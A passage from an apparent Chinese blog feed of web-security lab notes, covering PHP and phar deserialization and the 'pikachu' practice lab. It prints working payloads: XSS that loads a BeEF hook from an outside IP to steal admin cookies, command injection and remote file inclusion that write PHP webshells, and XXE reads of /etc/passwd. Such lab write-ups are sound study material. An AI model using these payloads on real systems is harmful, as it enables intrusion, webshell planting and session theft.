<span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$her</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;her=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>));    <span class="comment">// her被赋值随机md5值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name===<span class="variable language_">$this</span>-&gt;her)&#123;     <span class="comment">// 要求name和her完全相等</span></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># hint.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);  </span><br><span class="line"><span class="title function_ invoke__">session_start</span>();  </span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$name</span>;  </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$her</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();  </span><br><span class="line"><span class="variable">$a</span>-&gt;name =&amp;<span class="variable">$a</span>-&gt;her;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;her&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure><p>「引用赋值绕过随机校验」+「session 序列化处理器传递恶意对象」+「魔术方法__wakeup 触发逻辑」</p><p>还可以结合文件上传来考</p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>phar是php一个压缩包，类似jar包</p><p>5.3或高版本<br>可以读phar伪协议<br>可以读取.phar文件</p><p>stub phar文件格式，格式为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xxx&lt;?php xxx;__HALT_COMPiLER;?&gt;;</span><br><span class="line">mainfest压缩文件的属性等信息，以序列化存储</span><br><span class="line">contents压缩文件的内容</span><br><span class="line">signature签名，放在文件尾</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087698-cab760a0-669e-411d-8fcb-c73885c54e26.jpg" alt="null"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087763-66f6d2b1-2cf3-4aec-9920-da023d55a869.jpg" alt="null"></p><p>漏洞页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&quot;echo &#x27;ok&#x27;;&quot;</span>;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function">    </span>&#123;  </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;output);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))  <span class="comment">// 关键触发点</span></span><br><span class="line">&#123;    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];    <span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>));  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>下面这个payload要上传一个phar文件<br>这里他直接点那个生成就给你上传了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=phar://test.phar&amp;a=system(%27whoami%27);</span><br></pre></td></tr></table></figure><p>生成phar代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Testobj</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$output</span>=<span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);   <span class="comment">//删除之前的test.par文件(如果有)  </span></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);  <span class="comment">//创建一个phar对象，文件名必须以phar为后缀  </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();  <span class="comment">//开始写文件  </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);  <span class="comment">//写入stub  </span></span><br><span class="line"><span class="variable">$o</span>=<span class="keyword">new</span> <span class="title class_">Testobj</span>();  </span><br><span class="line"><span class="variable">$o</span>-&gt;output=<span class="string">&#x27;eval($_GET[&quot;a&quot;]);&#x27;</span>;  </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);<span class="comment">//写入meta-data  </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>,<span class="string">&quot;test&quot;</span>);  <span class="comment">//添加要压缩的文件  </span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Metadata 段：存储了Testobj类的实例，且该实例的output属性值为 eval($_GET[&quot;a&quot;]);（核心恶意代码模板）</span></span><br></pre></td></tr></table></figure><p>phar修改成任何后缀都不影响解析<br>对具体的题目</p><p>phar使用条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">phar能上传到服务器端</span><br><span class="line">要有可用反序列化魔术方法作为跳板</span><br><span class="line">要有文件操作函数，入file_exits(),fopen(),file_get_contents()</span><br><span class="line">文件操作函数参数可控，且:、/、phar等特殊字符没被过滤</span><br></pre></td></tr></table></figure><h2 id="phar例题"><a href="#phar例题" class="headerlink" title="phar例题"></a>phar例题</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765972087834-911c2f5e-52c2-41f8-b31e-eec0e004028e.jpg" alt="null"></p><p>把phar后缀改成png任然可以解析<br>读取这个文件自动触发链子<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765972087900-da967cea-c563-4320-b6c0-53709c3f086a.png" alt="null"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;PHP反序列化基础原理解析&lt;/p&gt;</summary>
    
    
    
    <category term="php反序列化" scheme="https://flypigc.github.io/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="web安全" scheme="https://flypigc.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>pikachu+upload+xss+ssti-labs汇总</title>
    <link href="https://flypigc.github.io/2025/12/13/%E9%9D%B6%E5%9C%BA/"/>
    <id>https://flypigc.github.io/2025/12/13/%E9%9D%B6%E5%9C%BA/</id>
    <published>2025-12-13T13:48:36.780Z</published>
    <updated>2025-12-21T04:55:22.863Z</updated>
    
    <content type="html"><![CDATA[<p>pikachu+xss+ssti-labs汇总</p><span id="more"></span><h1 id="pikachu靶场"><a href="#pikachu靶场" class="headerlink" title="pikachu靶场"></a>pikachu靶场</h1><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><h3 id="反射型GET"><a href="#反射型GET" class="headerlink" title="反射型GET"></a>反射型GET</h3><p>危害前端用户<br>窃取cookie</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo beef-xss</span><br></pre></td></tr></table></figure><p><a href="http://127.0.0.1:3000/ui/panel">http://127.0.0.1:3000/ui/panel</a><br>beef<br>2005<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633680454-22acdfae-e5da-49be-99f3-501f504bda2b.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://&lt;IP&gt;:3000/hook.js</span><br></pre></td></tr></table></figure><h3 id="反射型-get"><a href="#反射型-get" class="headerlink" title="反射型(get)"></a>反射型(get)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=&lt;script src=&quot;http://172.27.245.57:3000/hook.js&quot;&gt;&lt;/script&gt;&amp;submit=submit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633680609-4ab0f135-6762-4834-b26a-51d3c885c26f.jpg" alt="null"></p><p>播放音频</p><p>在kali桌面监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8000</span><br></pre></td></tr></table></figure><p>然后去访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.27.245.57:8000/misc.wav</span><br></pre></td></tr></table></figure><p>就成功播放了音乐<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633680702-97b84aa3-47fc-464a-b579-ebf33552c015.jpg" alt="null"></p><h3 id="反射型POST"><a href="#反射型POST" class="headerlink" title="反射型POST"></a>反射型POST</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633680796-35b5d0fa-b6c3-46bb-930a-81eb614ac6cd.jpg" alt="null"></p><h3 id="存储型"><a href="#存储型" class="headerlink" title="存储型"></a>存储型</h3><p>执行后一直会弹窗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;test&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="dom型"><a href="#dom型" class="headerlink" title="dom型"></a>dom型</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633680907-be043dc7-932e-4083-ba4d-d698d6bf74b3.jpg" alt="null">拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see?&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&#x27;&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&lt;a href=&#x27;&#x27;&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&#x27;onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&lt;a href=&#x27;&#x27;onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;&#x27;&gt;what do you see?&lt;/a&gt;</span><br></pre></td></tr></table></figure><h3 id="dom型xss-x"><a href="#dom型xss-x" class="headerlink" title="dom型xss-x"></a>dom型xss-x</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see?&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">&#x27;&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&lt;a href=&#x27;&#x27;&gt;&lt;img src=&quot;###&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line"></span><br><span class="line">&#x27;onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">&lt;a href=&#x27;&#x27;onclick=&quot;alert(&#x27;xss&#x27;)&quot;&gt;&#x27;&gt;what do you see?&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>多点一部</p><h3 id="xss盲打"><a href="#xss盲打" class="headerlink" title="xss盲打"></a>xss盲打</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633680988-221717b4-9fca-470e-a623-7c6725833be2.jpg" alt="null"><br>依旧xss-beef</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://172.27.245.57:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633681141-83640545-c26c-40ee-801a-9aa69bcef76c.jpg" alt="null"><br>拿到管理员cookie就可以用管理员登陆<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633681235-b0dd30d3-cccd-49b5-8188-0bbb94f06c74.jpg" alt="null"></p><h3 id="xss过滤"><a href="#xss过滤" class="headerlink" title="xss过滤"></a>xss过滤</h3><p>就是过滤了script<br>直接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;onerror=&#x27;alert(1)&#x27;/&gt;&#x27;</span><br></pre></td></tr></table></figure><h3 id="xss-htmlspecialchars"><a href="#xss-htmlspecialchars" class="headerlink" title="xss-htmlspecialchars"></a>xss-htmlspecialchars</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633681340-b098db1c-1ef9-45eb-bb9d-909bc702076f.jpg" alt="null"></p><p>htmlspecialchars在php8版本前是不会对’做转义的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633681497-8a68432b-e8b5-4ca9-9345-d90d5bb1e254.jpg" alt="null"></p><p>xss之href输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;onclick=&#x27;alert(1)&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633681695-0802819e-18be-47ba-8f28-33e40811a6ad.jpg" alt="null">、<br>单引号杯转义了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(1)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633681773-a932a046-cb5d-41a0-b64b-e07cf54f6383.jpg" alt="null"></p><h3 id="xss之js输出"><a href="#xss之js输出" class="headerlink" title="xss之js输出"></a>xss之js输出</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633681858-9a6ae05d-5619-4c61-a17d-11e776825d97.jpg" alt="null"><br>直接闭合注释后面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;alert(1)//</span><br></pre></td></tr></table></figure><h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p>linux<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682034-5a433072-fcf3-442c-9ee2-632d6be067ae.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;echo &#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27; &gt; 1.php</span><br></pre></td></tr></table></figure><p>windows<br><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682139-388d9efd-4ff5-41db-a8db-32ff5bb3f9fd.jpg" alt="null"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 &amp; dir</span><br><span class="line">127.0.0.1 &amp; echo &quot;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&quot; &gt; 1.php</span><br></pre></td></tr></table></figure><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;echo &#x27;&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;&#x27; &gt; 1.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682226-5de7d3cd-eb4d-4bbe-a954-f299b134e478.jpg" alt="null"></p><p>可以文件包含读文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=115.190.102.32:8000/1.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682311-4a56d40a-91c7-4520-900d-4b7a4aba5fd5.jpg" alt="null"><br>用.txt后缀访问即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">file_put_contents(&quot;shell2.php&quot;, &#x27;eval($_POST[&quot;1&quot;]);&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="client-type"><a href="#client-type" class="headerlink" title="client type"></a>client type</h3><p>写一个webshell<br>正常图片抓包改php就成功上传了</p><h3 id="MIME类型"><a href="#MIME类型" class="headerlink" title="MIME类型"></a>MIME类型</h3><p>修改Content-Type:为以下内容任意</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">image/apng</span><br><span class="line">image/avif</span><br><span class="line">image/gif</span><br><span class="line">image/jpeg</span><br><span class="line">image/png</span><br><span class="line">image/svg+xml</span><br><span class="line">image/webp</span><br></pre></td></tr></table></figure><h3 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h3><p>函数要求是有效的图像文件</p><p>将文件的后缀改png<br>并不能绕<br>真图像里面附带信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1cc.png /b +she.php /a shell.png</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682393-ad39f617-c7b0-4266-ba77-8b0aba50abd3.jpg" alt="null"></p><p>上传shell.png就直接上传成功了</p><p>绝对路径<br>文件包含拼接图片(绝对路径)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename=../../../../var/www/html/vul/unsafeupload/uploads/2025/12/12/371470693b111177b45306121694.png</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682479-88fbe9c9-d3da-4b6b-aba9-e9b7b5c3eec5.jpg" alt="null"></p><h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><h3 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h3><p>lucy&#x2F;123456,<br>lili&#x2F;123456,<br>kobe&#x2F;123456</p><p>访问其他用户信息</p><h3 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h3><p>这里有两个用户<br>admin&#x2F;123456,<br>pikachu&#x2F;000000,<br>admin是超级boss</p><p>简单来说就是以普通用户访问管理员管理页面url可以直接修改</p><h2 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h2><p>什么是XML?<br>用来传输数值<br>读取本地文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE root [  </span><br><span class="line">        &lt;!ENTITY hello SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">        ]&gt;  </span><br><span class="line">&lt;root&gt;&amp;hello;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>CTRL+U ：URL加密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE root [  </span><br><span class="line">        &lt;!ENTITY hello SYSTEM &quot;file:///etc/passwd&quot;&gt;  </span><br><span class="line">        ]&gt;  </span><br><span class="line">&lt;root&gt;&amp;hello;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>探测内网存活端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE root [  </span><br><span class="line">        &lt;!ENTITY hello SYSTEM &quot;http://127.0.0.1:80&quot;&gt;  </span><br><span class="line">        ]&gt;  </span><br><span class="line">&lt;root&gt;&amp;hello;&lt;/root&gt;</span><br></pre></td></tr></table></figure><p>爆破80这里，就可以看内网哪些端口开了</p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682562-c70a9acb-fc9c-4de8-87cc-b97d835b819e.jpg" alt="null"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$height</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$zhangsan</span>=<span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line"><span class="variable">$zhangsan</span>-&gt;name=<span class="string">&#x27;张三&#x27;</span>;  </span><br><span class="line"><span class="comment">//var_dump($zhangsan);  </span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$zhangsan</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>  </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;  </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$height</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="variable">$zhangsan</span>=<span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line"><span class="variable">$zhangsan</span>-&gt;name=<span class="string">&#x27;张三&#x27;</span>;  </span><br><span class="line"><span class="comment">//var_dump($zhangsan);  </span></span><br><span class="line"><span class="variable">$zhangsan</span>-&gt;height=<span class="number">20</span>;  </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$zhangsan</span>);</span><br><span class="line"></span><br><span class="line">O:<span class="number">6</span>:<span class="string">&quot;Person&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;height&quot;</span>;i:<span class="number">20</span>;&#125;</span><br></pre></td></tr></table></figure><p>反序列化函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Person  </span><br><span class="line">&#123;  </span><br><span class="line">    var $name;  </span><br><span class="line">    var $height;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s=&#x27;O:6:&quot;Person&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;张三&quot;;s:6:&quot;height&quot;;i:20;&#125;&#x27;;</span><br><span class="line">un</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/jpg/62156892/1765633682646-b297bdc7-4ac1-4591-9eae-b0443a541357.jpg" 